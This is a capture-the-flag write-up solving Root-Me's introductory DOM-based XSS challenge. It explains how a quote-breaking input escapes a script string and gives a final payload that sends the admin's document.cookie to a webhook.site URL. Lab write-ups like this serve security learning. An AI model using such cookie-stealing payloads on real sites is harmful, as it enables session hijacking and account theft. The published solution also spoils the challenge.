[XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction?action_solution=voir#validation_challenge)

**Objective:** Steal the admin's session cookie using a DOM-based XSS vulnerability.

### Step 1: Finding the Vulnerability

Test the number input field with:

javascript

```javascript
';alert(1);//
```

**Result:** Alert box appears - XSS confirmed!
why this works?  when you just enter something and submit if you look at the inspect, you can see the input used in script and in js value. so we break it by using ' and then finish the command using ; and then our own command alert(1) then we finish our command ; and then we comment the rest of old code //

### Step 2: Setting Up Cookie Exfiltration

1. Go to [https://webhook.site](https://webhook.site)
2. Copy your unique URL

### Step 3: The Final Payload

Simply enter this in the **number field** and click Submit:

```javascript
';window.location='https://webhook.site/b22fd4ff-7aad-4682-bb00-477aae42a1a9/?c='+document.cookie;//
```

**That's it!**

When you submit:

- You'll be redirected to webhook.site
- Check your webhook dashboard
- You'll see the admin's cookie in the `?c=` parameter